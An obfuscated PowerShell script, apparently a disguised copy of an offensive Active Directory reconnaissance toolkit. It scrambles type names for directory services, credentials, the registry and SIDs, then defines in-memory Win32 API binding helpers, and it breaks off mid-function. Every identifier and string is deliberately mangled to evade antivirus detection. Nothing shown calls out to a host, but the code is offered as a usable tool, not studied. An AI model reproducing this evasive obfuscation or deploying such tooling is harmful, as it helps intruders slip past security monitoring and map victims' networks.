  $BN7iT =  [tYPE]("{5}{10}{0}{4}{9}{7}{6}{1}{3}{8}{2}" -F '.InTeRoPS','l','nTIoN','in','erv','rU','s.Cal','cE','gCONve','i','ntIme')  ;   sv  Q1U70  ( [tYpe]("{0}{4}{5}{2}{3}{1}" -f'Run','arsET','INTerO','PSErVIcEs.Ch','T','iME.')  );  $DMCR=  [TYpE]("{8}{1}{0}{2}{4}{6}{3}{5}{7}"-f'iC','SERV','eS.','T','Dl','ATtRIBu','liMpor','Te','RUntImE.INTEroP') ; $Ld92o  =  [tYPe]("{4}{0}{2}{3}{1}"-f'agsAt','TE','TRiB','u','fl'); $T93xU = [tYPE]("{0}{2}{4}{7}{6}{3}{1}{5}"-F 'ReF','ckin','LecTI','pA','oN.','GSiZE','mIT.','E') ;  $F64  =[tYPe]("{3}{2}{4}{5}{1}{0}"-f'es','ATTRIBut','EflectION.t','r','y','pE');  $UT7=[tYpe]("{6}{0}{1}{2}{7}{5}{8}{3}{4}"-f 'NT','i','me','u','te','S.MaRsh','rU','.iNTErOpseRVIcE','ALAsATtriB') ; sET-Item VARIabLE:X0t8p  ([tYPe]("{0}{1}"-F'T','ypE'))  ;  sEt  ('N7'+'y') ([TypE]("{0}{1}{2}{6}{7}{3}{4}{5}"-F 'R','Ef','LeCTIoN.','iT','.O','pcodES','E','m'))  ;   Set ("4w"+"A1")  (  [Type]("{1}{0}{2}" -F 'AT','iO.P','H')  ) ;  Set-itEm  ('vAri'+'aBle:dM'+'H') (  [TYpE]("{2}{0}{3}{4}{1}"-F's','IO.FILe','SY','TE','m.') );Sv 2tHYZ5 ( [Type]("{2}{3}{0}{1}{4}"-F'.','iO.fIl','SY','StEm','EMODe') );  sET-Variable  ('DJ4'+'p') ([tYpE]("{0}{3}{1}{2}{4}"-F'SysTEm.i','.fil','E','o','AcceSs') )  ;   seT ('63A7'+'o')  ( [TyPe]("{3}{1}{2}{0}" -F'E','o.fIL','EShar','I')) ; set-itEm  vARIable:5K1bTM ([tyPe]("{2}{0}{1}"-F'd','Ns','NEt.') )  ;   seT  732m (  [TYpe]("{2}{3}{1}{0}"-F 'R','AtO','ac','tIv')) ;   $x2N1v=[TypE]("{0}{1}{2}{5}{3}{4}"-F 'sySt','E','m.threAd','NG.th','read','i') ; SEt t83XJh ([typE]("{0}{4}{1}{2}{3}" -f 'rE','eCtION.','aS','sEMBLY','Fl')) ;   seT-item ('varIaBL'+'e:'+'2M'+'g') (  [tYPE]("{0}{3}{2}{1}"-F 'sy','tEr','R','STEM.biTConVE'))  ;  $vrT  =[TyPe]("{8}{0}{4}{6}{3}{1}{5}{2}{7}"-f'YsT','n.BI','l','EcTiO','E','NDInGF','m.REFl','AGs','s'); sEt-ITEm  VaRIabLe:liVAPZ ( [TYPE]("{1}{9}{5}{10}{8}{4}{0}{2}{7}{3}{6}"-f'ErviCeS.R','sYsTe','efeRRalchAs','goPtI','S','.','on','in','orY','m','DIreCt'));   $Qt87w  =  [TYpE]("{9}{10}{8}{2}{7}{6}{1}{5}{4}{0}{3}"-F 'a','r','eC','skS','m','VICes.SecuRItY','sE','tOrY','Em.DiR','sy','st');  sEt-ITeM vaRIABLe:Zp8C (  [TypE]("{1}{0}"-f 'ay','arr') );    $sk6  = [TyPe]("{0}{1}{2}"-F 'systEM.Con','V','eRT')  ; sET-Item ("v"+"ArIABlE:V"+"e"+"t") ( [Type]("{8}{1}{4}{3}{7}{6}{5}{0}{2}"-F 'dIRECTOry.','.dIReCt','DOMain','c','ORyseRVi','tIvE','.aC','eS','syStEm'))  ;set-iTem  ('VA'+'RI'+'aBle:WQ'+'EG') ([tYpE]("{0}{1}" -f'eN','UM') ) ;  $SQPY8 =  [TYPE]("{1}{3}{0}{2}"-f 'C','BI','ONveRteR','T')  ;  $ie9Q = [TyPE]("{4}{0}{1}{3}{2}"-F'xt.','EncoDi','G','n','SystEm.te') ;    set-varIABLe ('zH7'+'01')  ([tYpe]("{1}{0}"-F 'd','gUi') ) ;    $O7Y  = [typE]("{1}{5}{6}{4}{3}{2}{0}"-F'TIonS','s','tOP','pLI','tem.STriNgs','Y','s')  ; SET-ItEm  ("vaRi"+"aBlE"+":wtD42") ( [TyPE]("{1}{2}{0}"-F 'rT','Conv','e'));   set-VAriAbLE  ('v0'+'S') (  [tYpe]("{1}{0}"-f 'X','Rege')  ) ;    $F2K  =  [tyPe]("{2}{4}{6}{5}{1}{3}{0}{7}" -f'Yk','In32.r','M','EGisTr','ICrosoF','.w','t','ey');  SET  o1F5 (  [type]("{1}{8}{3}{4}{5}{10}{2}{11}{7}{6}{9}{0}"-F'HaL','S','TI','T','EM.','ru','c','rvI','Ys','eS.MArS','n','me.IntErOpSe') )  ;    SEt-ItEm  varIablE:w7T  (  [TypE]("{0}{1}"-f'I','O.File')  )  ;   seT-ITeM  ('va'+'RIaB'+'le:o'+'w6') ([TyPE]("{8}{6}{11}{4}{16}{5}{7}{15}{14}{3}{0}{13}{10}{2}{9}{1}{12}" -F 'TIaLSEsSI','at','s','S.InI','.maN','ToM','STe','atiON.rUNs','sy','T','n','m','E','O','Ace','p','AGEMeNt.aU')  )  ;   SeT-iTem VaRiAble:2pnA (  [Type]("{2}{5}{1}{6}{4}{0}{3}"-F'.','h','SysT','apArTMentStATe','DINg','EM.T','Rea'));  $x2A= [Type]("{1}{2}{3}{0}" -f 'Ry','Ru','nSPa','CeFacTo') ;    seT-itEM VARiABLE:oRBvw4 (  [tYPE]("{0}{2}{1}" -f'poWE','LL','RShe') );   set  813fdT  (  [TYPE]("{0}{2}{1}" -f'ENvI','eNT','ronM'));   SeT-itEM  ("vARiab"+"LE:IXtr"+"o")  (  [TyPE]("{0}{4}{2}{3}{1}" -f 'S','NS','Em.N','et.D','yst') )  ;   set  2PFhU4  ( [type]("{0}{1}" -F 'DA','TetIME')  )  ;SET-vaRIabLe  6cl  ( [tYPe]("{2}{0}{1}" -f 'o.diRE','cTORY','I') )  ;  SeT-Item ("vAR"+"iABlE:p"+"x4q") ( [tYpE]("{12}{6}{1}{5}{0}{3}{7}{10}{2}{9}{8}{11}{4}"-F '.','E','tY.prinC','Se','siDTYpe','m','sT','c','Al.we','IP','URI','llKNOwn','Sy')  );seT-varIaBLe  ('9'+'1Yp') ([TyPE]("{4}{5}{7}{8}{1}{0}{3}{2}{6}" -F'rv','Se','.Ma','ICes','R','UN','RSHal','timE.i','nteRoP') ) ;    sEt 0DSqR  ([TyPe]("{4}{3}{5}{6}{2}{1}{0}"-f 'al','N.PsCreDenTI','tOMatIo','NageMEnt','Ma','.a','u') ) ;   SEt BY3qhu  (  [TyPE]("{10}{6}{5}{8}{3}{9}{13}{4}{0}{7}{11}{12}{1}{2}"-F 'cTivEDI','Y.FOr','esT','o','Ices.a','I','d','Re','REcT','ryse','sYSTem.','C','ToR','rV') );  seT-ItEM  ("VArI"+"Able"+":915Y") ( [TyPE]("{1}{0}"-f 'TRInG','s') )  ;  SET-ITem  ('va'+'rIABlE:'+'1'+'V4r')  ([tyPE]("{1}{0}" -F'NTpTr','i')  )  ;    sEt-iteM  VArIAble:dLfa  ([TYpE]("{1}{0}"-F '2','iNT3') )  ;  












function N`Ew-InMem`o`R`ymODULe {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{8}{10}{6}{2}{3}{4}{1}{11}{5}{0}{9}{7}"-f 'ng','at','F','o','rSt','i','ocess','unctions','PS','F','UseShouldPr','eChang'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(PoSITIoN = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Mo`d`ULEna`ME} =  $ZH701::("{0}{1}"-f 'NewGui','d').Invoke().("{2}{0}{1}"-f'Stri','ng','To').Invoke()
    )

    ${A`ppDo`MA`In} =  (  GeT-vARIabLE t83xJh  -ValUEONL  )."ASs`Emb`ly".("{1}{2}{0}" -f'Type','Ge','t').Invoke(("{0}{3}{4}{2}{1}"-f'Sy','n','ai','stem.AppDo','m')).("{2}{0}{1}"-f'tProp','erty','Ge').Invoke(("{1}{0}{2}"-f 'urre','C','ntDomain')).("{1}{2}{0}" -f 'ue','Get','Val').Invoke(${n`Ull}, @())
    ${loa`dEDa`Sse`m`Blies} = ${APpd`O`main}.("{1}{3}{2}{0}"-f'ies','GetAss','bl','em').Invoke()

    foreach (${aSSE`m`BlY} in ${lo`ADed`A`sS`emBLIeS}) {
        if (${AS`sE`mbLY}."F`U`llNAme" -and (${assEmb`Ly}."FUlL`N`AMe".("{0}{1}"-f'S','plit').Invoke(',')[0] -eq ${MODu`l`EnAmE})) {
            return ${AsSe`M`B`ly}
        }
    }

    ${DYNasSem`B`LY} = &("{1}{0}{2}"-f'ew-Obje','N','ct') ("{2}{1}{3}{0}{4}"-f 'sembl','tion.','Reflec','As','yName')(${Mo`d`U`LENamE})
    ${dO`ma`in} = ${a`PP`domAiN}
    ${AssE`MblYB`U`I`LDER} = ${doM`Ain}.("{0}{4}{1}{5}{2}{3}"-f'D','fineDynamic','ssembl','y','e','A').Invoke(${DYnaSS`EM`BLy}, 'Run')
    ${m`oduleB`U`Il`dEr} = ${AsSE`Mbl`Y`B`UILdeR}.("{4}{2}{3}{1}{0}" -f'cModule','nami','neD','y','Defi').Invoke(${moD`UL`EN`Ame}, ${Fa`l`se})

    return ${M`odU`l`ebuI`LDer}
}




function FU`Nc {
    Param (
        [Parameter(POSiTiON = 0, mANdatORy = ${TR`UE})]
        [String]
        ${dL`lNA`mE},

        [Parameter(posITion = 1, MANDAtoRY = ${Tr`UE})]
        [string]
        ${FUnc`T`i`O`NnaME},

        [Parameter(positIon = 2, mAnDatORy = ${t`RuE})]
        [Type]
        ${r`eTu`R`NtYPe},

        [Parameter(PosiTioN = 3)]
        [Type[]]
        ${Pa`RaMETe`RTYpES},

        [Parameter(posiTIOn = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${nAt`iveCal`l`iNGcO`NveNtioN},

        [Parameter(pOSitIOn = 5)]
        [Runtime.InteropServices.CharSet]
        ${ChAR`S`eT},

        [String]
        ${EN`Tr`YPo`InT},

        [Switch]
        ${s`e`TlASTerroR}
    )

    ${prO`pERTi`Es} = @{
        ("{1}{2}{0}"-f 'me','D','llNa') = ${D`L`LnamE}
        ("{3}{1}{2}{0}"-f'ctionName','u','n','F') = ${f`UNctI`ON`Na`ME}
        ("{1}{2}{3}{0}"-f 'pe','Retu','rnT','y') = ${rETUrn`TY`pE}
    }

    if (${PAr`Am`ETert`YP`es}) { ${pro`peRT`IeS}[("{2}{3}{0}{1}" -f'p','es','Parame','terTy')] = ${paRamE`T`E`RTYpEs} }
    if (${nATivEc`A`LLinG`con`VENtIoN}) { ${PRo`pE`RtIES}[("{4}{1}{0}{2}{3}"-f'C','ive','alling','Convention','Nat')] = ${Na`TIVeca`LlInG`C`OnvENT`iON} }
    if (${c`H`ArseT}) { ${p`ROPerti`ES}[("{2}{0}{1}"-f'arse','t','Ch')] = ${C`H`ARSet} }
    if (${setlaS`T`ErR`Or}) { ${P`RoPerTi`eS}[("{1}{2}{3}{0}" -f 'ror','SetL','astE','r')] = ${S`ETLAST`e`RROR} }
    if (${e`N`TRypoInt}) { ${P`RoPer`T`iEs}[("{0}{2}{1}" -f 'Entr','nt','yPoi')] = ${EN`T`Ry`PoINT} }

    &("{1}{0}{2}" -f'-Obje','New','ct') ("{0}{2}{1}"-f'PS','ct','Obje') -Property ${prO`PeR`T`iES}
}


function A`DD-`WI`N32TypE
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(mandatOry=${t`Rue}, vALuEfrOmPiPelINEbYPROPErTYnaMe=${t`Rue})]
        [String]
        ${DL`LNa`mE},

        [Parameter(MAnDatoRY=${Tr`Ue}, VALUEfRompIPeLinEbyproPerTyName=${Tr`Ue})]
        [String]
        ${Fun`c`T`iONnAMe},

        [Parameter(ValuEFrOmPIPeliNEbyPRoPeRtyNaME=${tr`Ue})]
        [String]
        ${eNTr`Y`pO`Int},

        [Parameter(mANdaToRy=${T`Rue}, valUEFroMPipelIneBypropeRTyNaMe=${tr`UE})]
        [Type]
        ${RE`TurntY`pE},

        [Parameter(VaLuefRoMPipelInEByPropErTYnAmE=${TR`Ue})]
        [Type[]]
        ${P`ARA`MET`eRT`YpES},

        [Parameter(valuEfroMpiPELInEBYPRopERTYNaMe=${t`Rue})]
        [Runtime.InteropServices.CallingConvention]
        ${n`A`TiVeca`LlIn`gCON`V`eNtIoN} =   (  LS ('vaRIaBlE:'+'bN'+'7i'+'T')  ).ValUE::"s`T`Dcall",

        [Parameter(VALUEfrOmPipElinEBYpROPertYnaME=${t`RUe})]
        [Runtime.InteropServices.CharSet]
        ${CH`A`RSET} =  (  lS  VArIABLE:Q1u70 ).vAluE::"a`UtO",

        [Parameter(VALUEfROmpipElINEbypROpErtYnamE=${t`Rue})]
        [Switch]
        ${s`eTlast`ErroR},

        [Parameter(mANdatOry=${T`RUe})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${mo`d`UlE},

        [ValidateNotNull()]
        [String]
        ${N`A`ME`SPAcE} = ''
    )

    BEGIN
    {
        ${tyP`e`HaSh} = @{}
    }

    PROCESS
    {
        if (${M`O`dULE} -is [Reflection.Assembly])
        {
            if (${na`mes`pa`ce})
            {
                ${t`yp`ehAsH}[${D`LLN`AME}] = ${Mo`DU`le}.("{0}{1}" -f 'Ge','tType').Invoke("$Namespace.$DllName")
            }
            else
            {
                ${tY`PEha`sh}[${dlL`N`Ame}] = ${moD`ULE}.("{1}{2}{0}"-f 'ype','Ge','tT').Invoke(${dLL`Na`me})
            }
        }
        else
        {
            
            if (!${tY`pe`HASh}.("{2}{0}{1}" -f'ainsK','ey','Cont').Invoke(${dl`LNAmE}))
            {
                if (${naM`es`pAce})
                {
                    ${ty`Pe`Hash}[${dL`lnaMe}] = ${M`oduLe}.("{2}{1}{3}{0}" -f 'e','ine','Def','Typ').Invoke("$Namespace.$DllName", ("{2}{1}{4}{5}{3}{0}"-f 't','l','Pub','FieldIni','ic,','Before'))
                }
                else
                {
                    ${tYp`EH`ASh}[${DlLN`AMe}] = ${m`o`dUlE}.("{2}{0}{1}"-f'ne','Type','Defi').Invoke(${Dl`l`NAme}, ("{6}{0}{4}{2}{5}{3}{1}"-f 'lic,Be','it','Fi','n','fore','eldI','Pub'))
                }
            }

            ${met`h`OD} = ${tYPe`Ha`sh}[${dl`ln`AmE}].("{0}{1}{2}"-f 'Defin','eM','ethod').Invoke(
                ${F`UncTi`On`N`AmE},
                ("{5}{4}{3}{1}{0}{2}"-f 'I','Static,Pinvoke','mpl',',','ic','Publ'),
                ${REtur`N`TyPE},
                ${pA`RAmEt`ER`TypeS})

            
            ${i} = 1
            foreach(${pa`RAmeT`er} in ${PaRa`MET`E`RTYp`es})
            {
                if (${pA`RaM`ETER}."i`SByReF")
                {
                    [void] ${ME`T`HOd}.("{3}{1}{0}{2}{4}"-f 'eParam','in','e','Def','ter').Invoke(${i}, 'Out', ${N`Ull})
                }

                ${i}++
            }

            ${dl`LI`mpORt} = [Runtime.InteropServices.DllImportAttribute]
            ${s`e`TLAsTERro`R`FI`Eld} = ${D`lL`imPoRT}.("{1}{0}{2}"-f'tFie','Ge','ld').Invoke(("{1}{0}{2}" -f'etLastE','S','rror'))
            ${cALl`i`NGCON`VEN`TIo`NfieLd} = ${D`LLiM`poRt}.("{2}{1}{0}" -f 'ld','tFie','Ge').Invoke(("{1}{0}{3}{2}{4}"-f'lingC','Cal','t','onven','ion'))
            ${C`HArs`E`TfieLd} = ${d`L`LIMP`ORT}.("{1}{2}{0}" -f'ld','GetFi','e').Invoke(("{1}{0}" -f 'Set','Char'))
            ${eNTrypOi`N`TF`ie`ld} = ${dL`l`iMPorT}.("{0}{2}{1}" -f 'Ge','eld','tFi').Invoke(("{0}{1}{3}{2}" -f 'E','n','t','tryPoin'))
            if (${S`EtL`AStErR`OR}) { ${SLE`V`ALuE} = ${tr`Ue} } else { ${SL`EVal`Ue} = ${F`Alse} }

            if (${ps`Bou`NDparA`MeTErS}[("{2}{1}{0}{3}"-f 'oin','ntryP','E','t')]) { ${E`xp`OR`TedFu`N`cName} = ${e`N`TRYpoInT} } else { ${EXPo`Rt`ED`Fu`NCNaMe} = ${FuNC`TiONN`AmE} }

            
            ${c`ONsT`RuCtOR} =  (geT-vARIablE  DMcR).vAluE."G`e`TcOns`TrUcTOr"([String])
            ${Dll`i`mP`oRt`AT`TriBuTE} = &("{2}{0}{1}" -f 'c','t','New-Obje') ("{0}{2}{6}{1}{5}{4}{3}"-f'Reflection.E','C','mit','ibuteBuilder','tomAttr','us','.')(${c`ONstr`UC`Tor},
                ${dlL`NA`me}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${sEtL`Aster`RorfIe`Ld},
                                           ${CaLLI`N`gCOnve`NtionF`iE`Ld},
                                           ${c`HAr`SE`Tfi`eld},
                                           ${EN`T`RYpoI`NTfield}),
                [Object[]] @(${SLEV`A`lUe},
                             ([Runtime.InteropServices.CallingConvention] ${NativE`CAll`INgc`Onve`N`TI`On}),
                             ([Runtime.InteropServices.CharSet] ${C`ha`RsEt}),
                             ${EXporTe`df`U`NCn`AmE}))

            ${mETH`od}.("{3}{0}{1}{2}" -f 'etCustom','Attr','ibute','S').Invoke(${d`LlIMPOR`T`AttrI`B`U`TE})
        }
    }

    END
    {
        if (${Mo`duLE} -is [Reflection.Assembly])
        {
            return ${tY`pe`h`ASH}
        }

        ${rEtU`R`NtYP`ES} = @{}

        foreach (${k`Ey} in ${TY`p`ehAsh}."K`eYs")
        {
            ${TY`PE} = ${T`YpeHA`Sh}[${k`EY}].("{0}{1}{2}" -f 'Create','T','ype').Invoke()

            ${r`ETUrNtyp`ES}[${K`ey}] = ${T`yPe}
        }

        return ${reTU`Rn`TYp`ES}
    }
}


function pSeN`UM {


    [OutputType([Type])]
    Param (
        [Parameter(pOsiTion = 0, mANdAtoRY=${TR`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${mO`dUlE},

        [Parameter(POSiTIOn = 1, MaNDATOry=${T`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`ULlnamE},

        [Parameter(POSiTIOn = 2, MAnDAtORY=${T`RUe})]
        [Type]
        ${TY`pE},

        [Parameter(PoSitIon = 3, mAndatOry=${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${EN`UmeleM`En`Ts},

        [Switch]
        ${BiT`F`IelD}
    )

    if (${m`Od`UlE} -is [Reflection.Assembly])
    {
        return (${m`OdULE}.("{0}{1}"-f'Get','Type').Invoke(${fUL`ln`AME}))
    }

    ${EN`Umt`YPe} = ${tY`PE} -as [Type]

    ${E`NuM`BUIl`DER} = ${mO`d`UlE}.("{0}{2}{1}"-f 'D','ineEnum','ef').Invoke(${fu`LlNAMe}, ("{2}{1}{0}"-f'blic','u','P'), ${eNuM`T`y`pE})

    if (${bIT`FIE`ld})
    {
        ${F`lA`Gs`c`onStrucToR} =  $Ld92o."g`ETCoNStRUCt`Or"(@())
        ${Flags`cUsToM`ATTriBU`TE} = &("{1}{2}{0}"-f'ect','N','ew-Obj') ("{4}{1}{2}{6}{0}{3}{5}" -f 'trib','.Emit.C','usto','uteBuil','Reflection','der','mAt')(${f`lAg`sCO`N`STRUCtOR}, @())
        ${e`NUmbU`IldeR}.("{3}{0}{5}{1}{2}{4}"-f 'et','Attr','i','S','bute','Custom').Invoke(${FlAGSC`UST`o`m`Att`RIBuTe})
    }

    foreach (${K`ey} in ${EN`UMelE`MEnts}."K`EyS")
    {
        
        ${N`UlL} = ${en`U`MBuI`LdeR}."DEfiN`e`li`Ter`Al"(${K`EY}, ${enu`mELEMeN`TS}[${K`eY}] -as ${en`UMT`y`Pe})
    }

    ${EnUm`BuIL`d`eR}.("{0}{2}{1}" -f 'C','eType','reat').Invoke()
}




function F`IElD {
    Param (
        [Parameter(pOsitioN = 0, ManDATORy=${T`RUe})]
        [UInt16]
        ${pOs`I`TiON},

        [Parameter(pOsiTioN = 1, mANdaToRY=${tR`Ue})]
        [Type]
        ${T`ype},

        [Parameter(pOsiTioN = 2)]
        [UInt16]
        ${oFf`SEt},

        [Object[]]
        ${MarSh`AL`As}
    )

    @{
        POSItiOn = ${P`Os`ITion}
        ("{1}{0}"-f 'e','Typ') = ${TY`Pe} -as [Type]
        ("{0}{2}{1}"-f'O','fset','f') = ${O`F`FSEt}
        ("{2}{1}{0}" -f's','rshalA','Ma') = ${marS`H`ALaS}
    }
}


function STR`UCT
{


    [OutputType([Type])]
    Param (
        [Parameter(POsItion = 1, mAnDAtOry=${t`Rue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${m`Odu`Le},

        [Parameter(POSItion = 2, mandaToRy=${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`ULlnaMe},

        [Parameter(pOsITIOn = 3, maNdAtOry=${TR`UE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${STRu`Ct`FIE`lDS},

        [Reflection.Emit.PackingSize]
        ${PAC`KiNg`s`IzE} =  $T93Xu::"u`NSp`eCIFIED",

        [Switch]
        ${ExpliCI`TLa`y`OUT}
    )

    if (${m`OdU`LE} -is [Reflection.Assembly])
    {
        return (${mO`D`ULe}.("{0}{2}{1}" -f'Ge','ype','tT').Invoke(${FuL`LNa`Me}))
    }

    [Reflection.TypeAttributes] ${sTr`UC`TatTRi`B`Utes} = ("{10}{7}{4}{0}{3}{1}{12}{6}{2}{5}{8}{9}{11}" -f '  ','la','      Publi','C',' ','c,
        Seal','
  ','  ','ed,
','        BeforeFi','AnsiClass,
   ','eldInit','ss,')

    if (${ex`Plic`itl`AyOUT})
    {
        ${S`TRucTaTTRIb`UT`ES} = ${STr`UcTa`TTR`i`BUTES} -bor  $f64::"expl`ic`iT`LAyO`UT"
    }
    else
    {
        ${s`TR`U`CTa`TTRIbuTes} = ${S`T`RU`CtatTrIB`UTES} -bor   $f64::"SEqUE`NTi`A`llAy`out"
    }

    ${STru`ct`B`Uil`DEr} = ${m`od`ULE}."DE`FINE`TYPe"(${F`UlLnA`mE}, ${sTRU`CT`Att`RIbu`TeS}, [ValueType], ${P`AcK`Ing`SIzE})
    ${cON`strUctORin`FO} =   (VAriaBle ("uT"+"7")).VAlUE.("{3}{2}{4}{0}{1}" -f'tructo','rs','tC','Ge','ons').Invoke()[0]
    ${sIZECo`N`sT} = @(  (cHildItEm vARIaBLe:Ut7 ).VALUe.("{0}{1}{2}" -f 'GetF','i','eld').Invoke(("{0}{2}{1}" -f 'Siz','st','eCon')))

    ${fI`ELds} = &("{0}{1}{2}"-f 'N','ew','-Object') ("{0}{1}{3}{2}"-f'H','ashta',']','ble[')(${sTRuC`TF`i`Elds}."cO`UNt")

    
    
    
    foreach (${F`i`ELD} in ${STrUC`TfI`Elds}."ke`yS")
    {
        ${i`N`Dex} = ${Stru`CtF`IEL`ds}[${F`iELd}][("{0}{2}{1}" -f'Po','ition','s')]
        ${fIE`L`Ds}[${IN`deX}] = @{("{0}{1}" -f'F','ieldName') = ${fi`e`Ld}; ("{0}{1}{2}"-f'Prop','erti','es') = ${St`RU`ct`FI`ElDS}[${fi`ELD}]}
    }

    foreach (${F`iE`lD} in ${fi`EL`dS})
    {
        ${Fi`EL`DNA`mE} = ${F`Ie`lD}[("{2}{1}{0}" -f 'ame','ldN','Fie')]
        ${FIE`lDp`ROP} = ${FI`e`LD}[("{1}{0}{2}" -f'e','Properti','s')]

        ${OF`FS`eT} = ${FielDp`R`Op}[("{1}{0}" -f't','Offse')]
        ${tY`pe} = ${f`IeL`dpROp}[("{0}{1}"-f'Ty','pe')]
        ${maR`SHal`AS} = ${f`Ie`LDpROP}[("{2}{0}{1}"-f'rs','halAs','Ma')]

        ${neW`FIeld} = ${S`T`RuCTbU`iLdER}.("{0}{1}{2}" -f 'D','efineFi','eld').Invoke(${fIEl`d`NAme}, ${tY`pE}, ("{1}{0}{2}" -f'b','Pu','lic'))

        if (${MarS`Hal`As})
        {
            ${uNmAn`A`G`EdtypE} = ${m`ARs`haLas}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${M`ARs`ha`lAs}[1])
            {
                ${si`Ze} = ${mA`Rs`ha`las}[1]
                ${A`TtR`I`BBuIl`DER} = &("{0}{3}{1}{2}" -f'N','e','ct','ew-Obj') ("{4}{3}{0}{6}{11}{5}{7}{9}{8}{1}{10}{2}" -f't','ld','r','i','Reflection.Em','mAtt','.C','r','buteBui','i','e','usto')(${CO`Ns`TrUct`o`RiNFo},
                    ${u`NManA`GEdT`yPe}, ${sI`ZeCo`N`st}, @(${S`IzE}))
            }
            else
            {
                ${aTt`Ri`BB`UI`lDeR} = &("{1}{0}{2}"-f '-','New','Object') ("{1}{8}{4}{7}{6}{0}{2}{3}{5}{9}"-f'b','Ref','ut','eBuild','Emit.Custo','e','tri','mAt','lection.','r')(${c`ONS`TRUCto`RInfO}, [Object[]] @(${uNMAn`AG`Ed`TY`Pe}))
            }

            ${ne`wF`IE`ld}.("{1}{0}{3}{2}{4}{5}"-f'us','SetC','mAtt','to','ri','bute').Invoke(${At`Tr`ib`BUILdEr})
        }

        if (${explI`c`I`TlayOuT}) { ${N`eWF`I`eld}.("{1}{0}" -f 't','SetOffse').Invoke(${O`Ff`set}) }
    }

    
    
    ${Size`Me`T`hOd} = ${st`RUCtB`Ui`LdER}.("{2}{1}{0}" -f'od','th','DefineMe').Invoke(("{1}{2}{0}" -f'e','GetS','iz'),
        ("{1}{3}{4}{0}{2}"-f 'c, Sta','Pu','tic','b','li'),
        [Int],
        [Type[]] @())
    ${ilg`ENerA`T`OR} = ${SIz`EMEt`Hod}.("{3}{2}{0}{1}" -f'en','erator','etILG','G').Invoke()
    
    ${IL`geNE`R`ATOr}."eM`IT"( $n7Y::"l`D`TokeN", ${S`T`RuCTbuIldEr})
    ${ILGeN`Era`T`Or}."e`MIt"(  $N7y::"Ca`ll",
          (GeT-vAriABle X0T8p  -VALuEo).("{2}{0}{1}"-f'M','ethod','Get').Invoke(("{3}{0}{1}{2}"-f'FromHand','l','e','GetType')))
    ${ilgE`NErA`ToR}."E`mit"( ( GeT-VariAble  n7y  -VAluEonL  )::"CA`ll",
          (  DIr  VArIable:91yp).vAluE.("{2}{1}{0}"-f'd','etho','GetM').Invoke(("{1}{0}"-f 'zeOf','Si'), [Type[]] @([Type])))
    ${ilgen`ERA`T`oR}."EM`IT"(  ( VARIaBLe N7y -vaL)::"r`eT")

    
    
    ${i`MPliCI`T`cONve`RtER} = ${s`TRU`CTBuil`Der}.("{3}{2}{0}{1}"-f 'ineM','ethod','ef','D').Invoke(("{2}{0}{1}" -f'mplic','it','op_I'),
        ("{3}{6}{0}{7}{8}{4}{9}{2}{1}{5}"-f'Sc',', HideBySig, Spe','c','Pr','ic,','cialName','ivate','o','pe, Publ',' Stati'),
        ${ST`RUc`TbUilDEr},
        [Type[]] @([IntPtr]))
    ${iLg`E`N`ERatOR2} = ${Imp`licITConVE`RT`er}.("{2}{1}{0}{3}"-f'at','etILGener','G','or').Invoke()
    ${iL`g`ENE`Ra`Tor2}."eM`iT"(  (geT-vaRIAbLE  n7Y).VAlUe::"N`OP")
    ${ilgen`erATo`R2}."E`Mit"(  (gEt-VaRIaBLE n7Y  ).VaLuE::"Ld`Arg_0")
    ${il`G`enerATo`R2}."EM`It"(  (  gET-vaRiablE ('N7'+'Y') ).valuE::"L`DT`oken", ${STrUcT`B`UI`ldER})
    ${I`lGen`Er`AtOr2}."EM`It"( $n7Y::"c`All",
         ( gET-VariaBLe X0T8P  ).VaLUe.("{2}{0}{1}"-f 't','Method','Ge').Invoke(("{2}{5}{1}{0}{4}{3}"-f'peFro','y','Ge','Handle','m','tT')))
    ${i`lGene`RAtor2}."Em`iT"( (get-VarIABlE  ('n'+'7y')).vALuE::"cA`LL",
         (gET-ITeM VariABlE:91yp).ValUE.("{1}{0}{2}" -f 'etMeth','G','od').Invoke(("{3}{4}{1}{0}{2}"-f 't','c','ure','PtrToStr','u'), [Type[]] @([IntPtr], [Type])))
    ${iLGeN`e`RAtor2}."e`MiT"(  ( geT-VARIaBLe n7y  -VAluEOn)::"unbox_`ANY", ${S`TrUCT`BuIL`d`ER})
    ${Il`G`E`NERatOr2}."EM`IT"( $n7Y::"r`ET")

    ${stRuctb`Ui`ld`er}.("{0}{2}{1}" -f'C','ateType','re').Invoke()
}








Function neW`-D`ynAM`ic`pAraME`Ter {


    [CmdletBinding(dEfAUlTPAraMeTerSETname = {"{0}{2}{1}" -f 'Dynami','ter','cParame'})]
    Param (
        [Parameter(mANDATory = ${t`RUE}, VAluefROmPIpeLine = ${t`RUE}, vALUeFROmPIPELINeByProperTYNAme = ${Tr`UE}, PAramEterSeTnAMe = "Dy`Na`M`iCPARameT`Er")]
        [ValidateNotNullOrEmpty()]
        [string]${na`ME},

        [Parameter(VaLueFROMPiPeLInebYprOpeRTyNaME = ${tr`Ue}, parAmEtErseTNAMe = "dyna`M`i`cpaRaMEt`Er")]
        [System.Type]${T`ypE} = [int],

        [Parameter(VaLUefrOmpIPELiNebypropERTYNaMe = ${Tr`Ue}, PARamETErSETnAMe = "dY`NAMiC`PA`RamE`TeR")]
        [string[]]${aLI`AS},

        [Parameter(VAlUefrOMpIPEliNEBYPropErTYnAmE = ${tR`UE}, PArAmEterSetNAmE = "DYnAmIc`Pa`RA`me`TeR")]
        [switch]${m`A`N`DATORy},

